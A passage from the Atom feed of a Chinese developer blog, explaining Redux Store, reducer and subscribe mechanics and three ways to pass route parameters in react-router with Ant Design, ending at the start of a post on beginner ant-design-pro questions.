    &lt;ol&gt;
      &lt;li&gt;数据修改逻辑写在Reducer（一个纯函数）里，Store实例在创建的时候，就会被传递这样一个reducer作为形参，这样Store就可以通过Reducer的返回值更新内部数据了，先看一个简单的例子(具体的关于reducer我们后面再讲)：
        &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;c1&quot;&gt;// 一个reducer&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;counterReducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'INCREASE'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DECREASE'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     &lt;span class=&quot;nl&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

 &lt;span class=&quot;c1&quot;&gt;// 传递reducer作为形参&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;store&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Redux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createStore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;counterReducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Store通过Reducer修改好了内部数据之后，又是如何通知Views需要获取最新的Store数据来更新的呢？
    &lt;ol&gt;
      &lt;li&gt;每一个Store实例都提供一个subscribe方法，Views只需要调用该方法注册一个回调（内含setState操作），之后在每次dispatch(action)时，该回调都会被触发，从而实现重新渲染；对于最新的Store数据，可以通过Store实例提供的另一个方法getState来获取，就像下面这样：&lt;/li&gt;
    &lt;/ol&gt;

    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unsubscribe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;subscribe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//如下&lt;/span&gt;

  &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;createStore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;initialState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;enhancer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;currentReducer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reducer&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;currentState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;initialState&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;listeners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// 省略若干代码&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// 通过reducer初始化数据&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActionTypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;INIT&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;subscribe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;getState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;replaceReducer&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;归纳总结&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;Store的数据修改，本质上是通过Reducer来完成的。&lt;/li&gt;
      &lt;li&gt;Store只提供get方法（即getState），不提供set方法，所以数据的修改一定是通过dispatch(action)来完成，即：action -&amp;gt; reducers -&amp;gt; store&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Store除了存储数据之外，还有着消息发布/订阅（pub/sub）的功能，也正是因为这个功能，它才能够同时连接着Actions和Views。&lt;/p&gt;

        &lt;p&gt;3.1 dispatch方法 对应着 pub&lt;/p&gt;

        &lt;p&gt;3.1 subscribe方法 对应着 sub&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;ant-redux-页面传递参数多种方式&quot;&gt;&lt;span id=&quot;form_5&quot;&gt;&lt;font&gt;Ant Redux 页面传递参数，多种方式&lt;/font&gt;&lt;/span&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;path 携带参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;props.params&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cm&quot;&gt;/**传递*/&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hashHistory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'react-router'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;App&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;React&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Component&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;cm&quot;&gt;/**使用方式*/&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Router&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;history&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hashHistory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
              &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Route&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/user/:name'&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;component&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;UserPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/Route&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/Router&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/**接收**/&lt;/span&gt;

  &lt;span class=&quot;kr&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;UserPage&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;React&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Component&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
          &lt;span class=&quot;kr&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/div&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)
&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;query 类似&lt;code class=&quot;highlighter-rouge&quot;&gt;request&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;get&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Route&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/user'&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;component&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;UserPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/Route&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
   &lt;span class=&quot;cm&quot;&gt;/**使用方式**/&lt;/span&gt;
   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/**获取数据**/&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;state方式类似于post方式，使用方式和query类似，首先定义路由：&lt;/p&gt;

    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;     &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Route&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/user'&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;component&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;UserPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/Route&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
     &lt;span class=&quot;err&quot;&gt;&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/**使用*/&lt;/span&gt;
     &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
     &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;na&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
     &lt;span class=&quot;cm&quot;&gt;/**获取数据*/&lt;/span&gt;
     &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;state&lt;/code&gt;方式依然可以传递任意类型的数据，而且可以不以明文方式传输.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://47.93.5.46/1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">其中是我在QQ群 362329545遇到的 问题，整理成问答录，希望能解决入门的烦恼，个人见解，如果有那里有错误请指出了我会积极改进，方便他人。</summary></entry><entry><title type="html">ant-design-pro 初级问题以及解答</title><link href="http://firsh.me/2018/05/28/ant-design-pro-stack1/" rel="alternate" type="text/html" title="ant-design-pro 初级问题以及解答" /><published>2018-05-28T15:21:44+08:00</published><updated>2018-05-28T15:21:44+08:00</updated><id>http://firsh.me/2018/05/28/ant-design-pro-stack1</id><content type="html" xml:base="http://firsh.me/2018/05/28/ant-design-pro-stack1/">&lt;h2 id=&quot;本章介绍的是ant-design-pro-使用中遇到的一些问题-以及个人的解决方式大牛勿喷&quot;&gt;本章介绍的是ant-design-pro 使用中遇到的一些问题 以及个人的解决方式，大牛勿喷。&lt;/h2&gt;

&lt;h2 id=&quot;react-与-ant-design-pro&quot;&gt;React 与 Ant-Design-Pro&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;下载工程：&lt;/li&gt;
&lt;/ul&gt;

